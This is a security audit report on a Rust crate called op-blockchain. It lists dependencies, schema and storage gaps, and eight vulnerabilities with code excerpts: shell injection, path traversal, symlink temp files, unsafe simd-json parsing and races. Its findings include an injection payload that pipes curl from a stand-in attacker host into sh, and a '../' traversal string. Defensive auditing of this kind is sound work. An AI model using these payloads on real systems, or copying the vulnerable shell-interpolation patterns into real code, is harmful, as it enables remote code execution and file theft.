# Production Security & Quality Audit: op-blockchain

## 1. Dependencies & Feature Inventory

### Direct Dependencies

The following table inventories all direct dependencies declared in `crates/op-blockchain/Cargo.toml` and resolved via the workspace `Cargo.toml`.

| Dependency | Declared Version | Enabled Features | Resolved Features / Source | Notes / Vulnerability Adjacent |
| :--- | :--- | :--- | :--- | :--- |
| `op-core` | Workspace | *None specified* | Path: `crates/op-core` | Internal control plane crate |
| `op-cache` | Path | *None specified* | Path: `crates/op-cache` | Internal caching crate |
| `tokio` | Workspace | `["full"]` | Resolved to `1.49.0` | Async runtime, `full` feature enabled globally |
| `serde` | Workspace | `["derive"]` | Resolved to `1.0.228` | Serialization framework |
| `simd-json`| Workspace | `["serde", "serde_impl"]`| Resolved to `0.13.11` | High-performance JSON parser |
| `anyhow` | Workspace | *None specified* | Resolved to `1.0.100` | Error handling framework |
| `thiserror`| Workspace | *None specified* | Resolved to `1.0.69` | Derive-macro error generation |
| `tracing` | Workspace | *None specified* | Resolved to `0.1.44` | Logging/tracing |
| `chrono` | Workspace | `["serde"]` | Resolved to `0.4.43` | Date and time library |
| `uuid` | Workspace | `["v4", "serde"]`| Resolved to `1.20.0` | Universally Unique Identifiers |
| `sha2` | Workspace | *None specified* | Resolved to `0.10.9` | Cryptographic hashing (SHA-256) |
| `gethostname`| Workspace | *None specified* | Resolved to `0.5.0` | Hostname lookup |

### Crate-Level Features

The `op-blockchain` crate defines the following `[features]` block in `crates/op-blockchain/Cargo.toml`:

```toml
[features]
default = []
ml = []
```

*   **`ml`**: Enables transformer-based vectorization pipelines. 
    *   **Gated Blocks**: Used in `crates/op-blockchain/src/plugin_footprint.rs` under `#[cfg(feature = "ml")]` at lines 112, 126, and 144 to invoke the global `ModelManager` and run semantic embedding logic.

---

## 2. Schema-as-Code Compliance & Gap Analysis

The `op-dbus-v2` architecture mandates a schema-as-code discipline. Ad-hoc serialized Rust structures or plain string parsing are flagged as severe schema management gaps.

### Schema Status Audit

*   **Protocol Buffer Integration**: Absent. There are no dependencies on `prost`, `tonic`, or schema generation tools in `crates/op-blockchain/Cargo.toml`.
*   **Ad-hoc Struct Definitions**: The primary data models, `BlockEvent` and `PluginFootprint`, are declared directly as localized Rust structs in two separate locations:
    *   `crates/op-blockchain/src/footprint.rs:10` and `footprint.rs:43`
    *   `crates/op-blockchain/src/plugin_footprint.rs:11`
*   **Duplicate Structures & Type Inconsistencies**: The two definitions of `PluginFootprint` are syntactically duplicated across separate files inside the same crate. `prelude` module exports are forced to alias `plugin_footprint::PluginFootprint` as `LegacyPluginFootprint` (in `crates/op-blockchain/src/lib.rs:24`), indicating an unresolved migration path.
*   **Ad-hoc Serialization Risks**: Writing unstructured, raw files inside subvolume directories (e.g. format: `block-{:012}.json`) without a single source of truth schema definitions (such as `.proto` or JSON schemas) will lead to critical state decoding panic vectors during rollbacks if structural upgrades occur.

---

## 3. Storage Backend Analysis

The storage backend usage has been scanned across all provided source files of `op-blockchain`.

| Backend | Found at File:Line | Role | Architectural Match |
| :--- | :--- | :--- | :--- |
| **BTRFS Subvolumes (FS-based)** | `crates/op-blockchain/src/blockchain.rs:47-49` | Dual-subvolume layout representing raw event timings, vector projections, and current states. | **Yes** (Matches subvolume specification) |
| **JSON Plain Files** | `crates/op-blockchain/src/btrfs_numa_integration.rs:118` | Writes block event metadata under `by-hash` inside BTRFS subvolume paths. | **Partial** (Lacks formal indexing DB) |
| **Binary Vector Slices** | `crates/op-blockchain/src/blockchain.rs:163` | Raw vector arrays written to disk as `.bin` or `.vec` files. | **No** (Expected unified vector storage like CozoDB/Qdrant) |

*   **Flagged Violation**: Embedded databases (like `cozo` or `sled`) are absent in this crate's implementation, although they are defined in the workspace `Cargo.toml`. Instead, raw file storage is used inside the BTRFS subvolumes, introducing file descriptor pressure and OS-level file manipulation races.

---

## 4. Deep Vulnerability Audit

### [VULN-01] Critical Shell Command Injection in Replication Pipelines

#### Description
The replication and vector streaming implementations construct shell pipeline commands by directly interpolating unvalidated parameter strings (`remote_path`, `remote`, and `replicas`) into strings executed via the system shell (`sh` / `bash`). 

#### Code Locations
*   `crates/op-blockchain/src/blockchain.rs:245-251`:
    ```rust
    let output = Command::new("sh")
        .arg("-c")
        .arg(format!(
            "btrfs send {} | ssh {} 'btrfs receive {}'",
            snapshot_path.display(),
            remote_path,
            remote_path
        ))
    ```
*   `crates/op-blockchain/src/streaming_blockchain.rs:475-481`:
    ```rust
    let output = Command::new("bash")
        .arg("-c")
        .arg(format!(
            "btrfs send {} | ssh {} 'btrfs receive /var/lib/blockchain/vectors/'",
            vector_snapshot.display(),
            remote
        ))
    ```
*   `crates/op-blockchain/src/streaming_blockchain.rs:512-516`:
    ```rust
    let cmd = format!(
        "btrfs send {} | tee {} > /dev/null",
        vector_snapshot.display(),
        tee_args.join(" ")
    );
    // ...
    let output = Command::new("bash")
        .arg("-c")
        .arg(&cmd)
    ```

#### Exploitation Vector
An attacker who is able to control the database replication endpoint registration or config file (e.g. through the D-Bus model interface or an HTTP control plane endpoint mapping to these methods) can supply a malicious string like `localhost; curl http://attacker.com/exploit | sh; #` as the `remote_path`, `remote` or any entry in `replicas`. Because the code runs these variables directly through `/bin/sh` or `/bin/bash`, it executes the injected shell command with the privileges of the active control plane daemon (often `root`).

---

### [VULN-02] Arbitrary Path Traversal in Rollback Operations

#### Description
The `rollback` and `rollback_to_snapshot` operations attempt to load snapshot states from disk by directly joining the base path with an unsanitized `snapshot_name` parameter. This allows path traversal bypassing outside the sandbox directory.

#### Code Locations
*   `crates/op-blockchain/src/blockchain.rs:229-231`:
    ```rust
    pub async fn rollback(&self, snapshot_name: &str) -> Result<PathBuf> {
        let snapshot_path = self.base_path.join("snapshots").join(snapshot_name);
    ```
*   `crates/op-blockchain/src/streaming_blockchain.rs:608-610`:
    ```rust
    pub async fn rollback_to_snapshot(&self, snapshot_name: &str) -> Result<PathBuf> {
        let snapshot_path = self.base_path.join("snapshots").join(snapshot_name);
    ```

#### Exploitation Vector
If an administrative API or D-Bus method exposes the rollback capability, an attacker can input a `snapshot_name` containing parent directory relative segments (e.g. `../../../../etc`). The path resolves to `base_path/etc`. Because the application verifies existence (`if !snapshot_path.exists()`), any path to a file or directory that exists on the system will pass this validation check and be returned to the calling context, leaking host files or executing states based on out-of-bounds configurations.

---

### [VULN-03] Predictable Temporary File Creation Vulnerable to Symlink Attacks

#### Description
When updating the current system state or writing granular plugin configurations, the blockchain writer places temporary state updates in predictable, static paths before atomically renaming them.

#### Code Locations
*   `crates/op-blockchain/src/streaming_blockchain.rs:323`:
    ```rust
    let temp_file = self.state_subvol.join(".current.json.tmp");
    tokio::fs::write(&temp_file, simd_json::to_string_pretty(state)?).await?;
    ```
*   `crates/op-blockchain/src/streaming_blockchain.rs:335`:
    ```rust
    let temp_file = plugins_dir.join(format!(".{}.json.tmp", plugin_name));
    ```

#### Exploitation Vector
If `state_subvol` or `plugins_dir` exists in a shared, world-writable directory (such as `/tmp` or a shared volume path), a local unprivileged attacker can create a symbolic link at `/var/lib/blockchain/state/.current.json.tmp` targeting an arbitrary file on the system (e.g., `/etc/shadow` or `/etc/cron.d/malicious`). When the blockchain control plane updates system state, it writes the configuration payloads into the symlinked destination, enabling arbitrary file overwrite and privilege escalation.

---

### [VULN-04] Cryptographic Block Integrity Failure via Temporal Clock Manipulation

#### Description
The timing blockchain marks timing data as authoritative and uses this value to calculate cryptographic block hashes. However, the system relies strictly on unvalidated system time, allowing the sequence of block hashes to be easily compromised.

#### Code Locations
*   `crates/op-blockchain/src/footprint.rs:24-29`:
    ```rust
    let timestamp = chrono::Utc::now().timestamp_millis() as u64;
    // ...
    // Compute hash
    let hash_input = format!("{}:{}:{}:{}", timestamp, category, action, data);
    ```
*   `crates/op-blockchain/src/plugin_footprint.rs:100-101`:
    ```rust
    let timestamp = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
    ```

#### Exploitation Vector
If an attacker manipulates the system's hardware clock, NTP servers, or container namespaces, they can force the application to construct hashes using backward-shifted or identical timestamps. This allows the generation of duplicate block hashes, breaks the sequential ordering of the timing trail, and enables hash-collision injection bypasses on immutable state verification.

---

### [VULN-05] Undefined Behavior via Unsafe Deserialization in SIMD Parsing

#### Description
The application reads data directly from block files and system states, immediately passing mutable string slices into `simd_json::from_str` within `unsafe` blocks without ensuring padding or structural validation invariants required by `simd-json`.

#### Code Locations
*   `crates/op-blockchain/src/btrfs_numa_integration.rs:150-151`:
    ```rust
    let mut data = tokio::fs::read_to_string(&block_file).await?;
    let block_data: simd_json::OwnedValue = unsafe { simd_json::from_str(&mut data)? };
    ```
*   `crates/op-blockchain/src/blockchain.rs:213-215`:
    ```rust
    let mut data = tokio::fs::read_to_string(&state_file).await?;
    Ok(unsafe { simd_json::from_str(&mut data)? })
    ```
*   `crates/op-blockchain/src/streaming_blockchain.rs:344-346`:
    ```rust
    let mut content = tokio::fs::read_to_string(&current_state_file).await?;
    Ok(unsafe { simd_json::from_str(&mut content)? })
    ```

#### Exploitation Vector
`simd-json` expects parsed buffers to be correctly padded to SIMD register boundaries (e.g. 32-byte or 64-byte padding) and to respect strict structural invariants. Reading unstructured text straight from files via `read_to_string` and passing them directly into `from_str` causes out-of-bounds pointer offsets and memory corruption if a corrupted block file or a trailing/malformed state document is loaded, manifesting as a Segmentation Fault or Undefined Behavior.

---

### [VULN-06] TOCTOU (Time-of-Check to Time-of-Use) File Operations

#### Description
The fast-path block retrieval logic checks whether a file exists using `block_file.exists()` before performing read operations on it. This represents a classic TOCTOU race condition.

#### Code Location
*   `crates/op-blockchain/src/btrfs_numa_integration.rs:137-147`:
    ```rust
    let block_file = cache_dir
        .join("blocks")
        .join("by-hash")
        .join(format!("{}.json", block_hash));

    if !block_file.exists() {
        return Ok(None);
    }

    // Read from BTRFS cache
    let mut data = tokio::fs::read_to_string(&block_file).await?;
    ```

#### Exploitation Vector
In highly active environments, cached block files can be deleted by retention pruners or log rotations immediately after `exists()` evaluates to `true` but before `read_to_string` is scheduled by the runtime. This triggers unhandled I/O failures that bubble up to the caller, potentially crashing the footprint receiver or generating denial-of-service conditions during active transactions.

---

### [VULN-07] Denial of Service via Fallback Copy Exhaustion

#### Description
The BTRFS subvolume creation and snapshot functions fall back to a fallback method of recursive directory copying (`copy_dir_recursive`) if BTRFS features are not supported by the underlying filesystem.

#### Code Locations
*   `crates/op-blockchain/src/blockchain.rs:125-131`:
    ```rust
    if stderr.contains("command not found") || stderr.contains("not a btrfs filesystem") {
        warn!(
            "BTRFS not available, creating regular directory: {:?}",
            path
        );
        tokio::fs::create_dir_all(path).await?;
    ```
*   `crates/op-blockchain/src/blockchain.rs:207-211`:
    ```rust
    if stderr.contains("not a btrfs") {
        debug!("BTRFS not available, using regular copy for snapshot");
        tokio::fs::create_dir_all(&snapshot_path).await?;
        copy_dir_recursive(&self.state_subvol, &snapshot_path).await?;
    ```

#### Exploitation Vector
When BTRFS is missing, the application attempts to copy files recursively on every snapshot interval or operation (if configured with `SnapshotInterval::PerOperation`). Under standard workloads, duplicating entire block states via synchronous filesystem copies exhausts the host's file descriptors, causes massive write I/O amplification, saturates CPU cores, and ultimately leads to an operational halt (Denial of Service).

---

### [VULN-08] Broken Immutability Guarantees via Non-BTRFS Directory Fallback

#### Description
A critical design requirement of the streaming blockchain is the immutability of the audit trails (append-only timeline). The application relies on BTRFS read-only subvolumes (`-r`) to guarantee this immutability. However, the presence of standard directory fallbacks bypasses these security properties.

#### Code Locations
*   `crates/op-blockchain/src/blockchain.rs:126-131`
*   `crates/op-blockchain/src/blockchain.rs:207-211`

#### Exploitation Vector
In deployments where the service is run on generic filesystems (ext4, XFS, overlayfs), the subvolume fallback code generates plain, mutable directories instead of BTRFS subvolumes. Because normal directories do not support subvolume locking, any compromised local agent or attacker gaining low-privilege control plane access can modify or erase the historic audit files in `timing_subvol`, completely undermining the integrity of the audit logs.